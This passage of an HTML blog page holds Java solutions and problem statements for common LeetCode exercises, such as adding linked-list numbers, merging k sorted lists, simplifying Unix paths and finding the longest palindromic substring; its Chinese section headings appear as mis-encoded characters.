<span class="variable">res</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>&amp;&amp;l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1.val&lt;=l2.val)&#123;</span><br><span class="line">                 head.next=l1;</span><br><span class="line">                l1=l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                head.next=l2;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125; </span><br><span class="line">            head=head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = l1==<span class="literal">null</span>?l2:l1;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers">Add Two Numbers âˆš</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 0 -&gt; 8</span><br><span class="line">Explanation: 342 + 465 = 807.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>,carry=<span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">now</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>||l2!=<span class="literal">null</span>||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> l1==<span class="literal">null</span>?<span class="number">0</span>:l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> l2==<span class="literal">null</span>?<span class="number">0</span>:l2.val;</span><br><span class="line">            sum = x+y+carry;</span><br><span class="line">            now.next=<span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            now=now.next;</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            l1 = l1==<span class="literal">null</span>?<span class="literal">null</span>:l1.next;</span><br><span class="line">            l2 = l2==<span class="literal">null</span>?<span class="literal">null</span>:l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="add-two-numbers-ii">Add Two Numbers II âˆš</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        Stack&lt;Integer&gt; s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s1.push(l1.val);</span><br><span class="line">            l1=l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            s2.push(l2.val);</span><br><span class="line">            l2=l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty()||!s2.isEmpty()||carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> s1.isEmpty()?<span class="number">0</span>:s1.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> s2.isEmpty()?<span class="number">0</span>:s2.pop();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> x+y+carry;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            carry=sum/<span class="number">10</span>;</span><br><span class="line">            node.next=ans.next;</span><br><span class="line">            ans.next=node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="reverse-words-in-a-string-">Reverse Words in a String -</span></h2><p>Given an input string, reverse the string word by word. </p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;the sky is blue&quot;</span><br><span class="line">Output: &quot;blue is sky the&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;  hello world!  &quot;</span><br><span class="line">Output: &quot;world! hello&quot;</span><br><span class="line">Explanation: Your reversed string should not contain leading or trailing spaces.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> a.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// step 1. reverse the whole string</span></span><br><span class="line">    reverse(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// step 2. reverse each word</span></span><br><span class="line">    reverseWords(a, n);</span><br><span class="line">    <span class="comment">// step 3. clean up spaces</span></span><br><span class="line">    <span class="keyword">return</span> cleanSpaces(a, n);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">reverseWords</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j || i &lt; n &amp;&amp; a[i] == <span class="string">&#x27; &#x27;</span>) i++; <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; i || j &lt; n &amp;&amp; a[j] != <span class="string">&#x27; &#x27;</span>) j++; <span class="comment">// skip non spaces</span></span><br><span class="line">      reverse(a, i, j - <span class="number">1</span>);                      <span class="comment">// reverse the word</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// trim leading, trailing and multiple spaces</span></span><br><span class="line">  String <span class="title function_">cleanSpaces</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">&#x27; &#x27;</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] != <span class="string">&#x27; &#x27;</span>) a[i++] = a[j++]; <span class="comment">// keep non spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">&#x27; &#x27;</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">if</span> (j &lt; n) a[i++] = <span class="string">&#x27; &#x27;</span>;                      <span class="comment">// keep only one space</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(a).substring(<span class="number">0</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// reverse a[] from a[i] to a[j]</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">t</span> <span class="operator">=</span> a[i];</span><br><span class="line">      a[i++] = a[j];</span><br><span class="line">      a[j--] = t;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="literal">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="literal">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="literal">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="åŠ¨æ€è§„åˆ’">åŠ¨æ€è§„åˆ’</span></h1><h2><span id="climbing-stairs">Climbing Stairs âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">       dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">       dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">           dp[i%<span class="number">3</span>] = dp[(i - <span class="number">1</span>)%<span class="number">3</span>] + dp[(i - <span class="number">2</span>)%<span class="number">3</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[n%<span class="number">3</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ ˆ">æ ˆ</span></h1><h2><span id="trapping-rain-water">Trapping Rain Water</span></h2><p>Given <em>n</em> non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.</p><p><img src="https://assets.leetcode.com/uploads/2018/10/22/rainwatertrap.png" alt="img"><br>The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. <strong>Thanks Marcos</strong> for contributing this image!</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1,0,2,1,0,1,3,2,1,2,1]</span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure><h2><span id="simplify-path">Simplify Path</span></h2><p>Given an <strong>absolute path</strong> for a file (Unix-style), simplify it. Or in other words, convert it to the <strong>canonical path</strong>.</p><p>In a UNIX-style file system, a period <code>.</code> refers to the current directory. Furthermore, a double period <code>..</code> moves the directory up a level.</p><p>Note that the returned canonical path must always begin with a slash <code>/</code>, and there must be only a single slash <code>/</code> between two directory names. The last directory name (if it exists) <strong>must not</strong> end with a trailing <code>/</code>. Also, the canonical path must be the <strong>shortest</strong> string representing the absolute path.</p><p> <strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/home/&quot;</span><br><span class="line">Output: &quot;/home&quot;</span><br><span class="line">Explanation: Note that there is no trailing slash after the last directory name.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/../&quot;</span><br><span class="line">Output: &quot;/&quot;</span><br><span class="line">Explanation: Going one level up from the root directory is a no-op, as the root level is the highest level you can go.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/home//foo/&quot;</span><br><span class="line">Output: &quot;/home/foo&quot;</span><br><span class="line">Explanation: In the canonical path, multiple consecutive slashes are replaced by a single one.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a/./b/../../c/&quot;</span><br><span class="line">Output: &quot;/c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a/../../b/../c//.//&quot;</span><br><span class="line">Output: &quot;/c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 6:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a//b////c/d//././/..&quot;</span><br><span class="line">Output: &quot;/a/b/c&quot;</span><br></pre></td></tr></table></figure><h1><span id="äºŒåˆ†æŸ¥æ‰¾">äºŒåˆ†æŸ¥æ‰¾</span></h1><h2><span id="search-in-rotated-sorted-array">Search in Rotated Sorted Array âˆš</span></h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p><p>You are given a target value to search. If found in the array return its index, otherwise return <code>-1</code>.</p><p>You may assume no duplicate exists in the array.</p><p>Your algorithmâ€™s runtime complexity must be in the order of <em>O</em>(log <em>n</em>).</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(nums.length==<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> lo=<span class="number">0</span>,hi=nums.length-<span class="number">1</span>,index=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(nums[lo]&lt;nums[hi]) ;</span><br><span class="line">       <span class="keyword">else</span> index=srch(nums);</span><br><span class="line">       <span class="keyword">if</span>(target&lt;=nums[hi]&amp;&amp;target&gt;=nums[index])<span class="keyword">return</span> bs(nums,index,hi,target);</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">return</span> bs(nums,lo,index-<span class="number">1</span>,target);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">bs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi,<span class="type">int</span> target)</span>&#123;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="type">int</span> mid=(lo+hi)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&lt;target)lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> a[lo]==target?lo:-<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">srch</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">       <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="type">int</span> mid= lo +(hi-lo)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&gt;a[a.length-<span class="number">1</span>]) lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> lo;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="åŒæŒ‡é’ˆ">åŒæŒ‡é’ˆ</span></h1><h2><span id="longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters âˆš</span></h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3. </span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">                j=Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(s.charAt(i),i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æœç´¢">æœç´¢</span></h1><h2><span id="longest-palindromic-substring">Longest Palindromic Substring Ã—</span></h2><p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> lo, maxLen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len-<span class="number">1</span>; i++) &#123;</span><br><span class="line">            extendPalindrome(s, i, i);  <span class="comment">//assume odd length, try to extend Palindrome as possible</span></span><br><span class="line">            extendPalindrome(s, i, i+<span class="number">1</span>); <span class="comment">//assume even length.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(lo, lo + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">extendPalindrome</span><span class="params">(String s, <span class="type">int</span> j, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; k &lt; s.length() &amp;&amp; s.charAt(j) == s.charAt(k)) &#123;</span><br><span class="line">            j--;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maxLen &lt; k - j - <span class="number">1</span>) &#123;</span><br><span class="line">            lo = j + <span class="number">1</span>;</span><br><span class="line">            maxLen = k - j - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id></span></h1><h1><span id="åŠ¨æ€è§„åˆ’">åŠ¨æ€è§„åˆ’</span></h1><h2><span id="maximum-subarray">Maximum Subarray âˆš</span></h2><p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum = 6.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 